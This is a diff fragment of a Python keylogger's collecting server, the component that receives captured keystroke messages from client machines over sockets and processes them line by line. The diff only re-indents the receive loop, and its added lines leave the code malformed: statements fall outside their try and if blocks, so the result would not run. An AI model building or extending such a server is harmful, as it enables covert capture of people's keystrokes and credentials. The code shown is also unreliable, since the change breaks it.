@@ -160,18 +160,18 @@ class KeyloggerServer:
                     if not ready:
                         continue
                     
-                    data = client_socket.recv(4096)
-                    if not data:
+                data = client_socket.recv(4096)
+                if not data:
                         print(f"Client {client_address} disconnected (no data)")
-                        break
-                    
-                    buffer += data.decode('utf-8', errors='ignore')
-                    
-                    # Process complete messages (separated by newlines)
-                    while '\n' in buffer:
-                        message, buffer = buffer.split('\n', 1)
-                        if message.strip():
-                            self.process_message(message)
+                    break
+                
+                buffer += data.decode('utf-8', errors='ignore')
+                
+                # Process complete messages (separated by newlines)
+                while '\n' in buffer:
+                    message, buffer = buffer.split('\n', 1)
+                    if message.strip():
+                        self.process_message(message)
                             
                 except socket.timeout:
                     # Timeout is normal, continue
@@ -179,7 +179,7 @@ class KeyloggerServer:
                 except socket.error as e:
                     print(f"Socket error for client {client_address}: {e}")
                     break
-                    
+                        
         except Exception as e:
             print(f"Error handling client {client_address}: {e}")
         finally:
@@ -187,7 +187,7 @@ class KeyloggerServer:
             if client_socket in self.clients:
                 self.clients.remove(client_socket)
             try:
-                client_socket.close()
+            client_socket.close()
             except:
                 pass
     
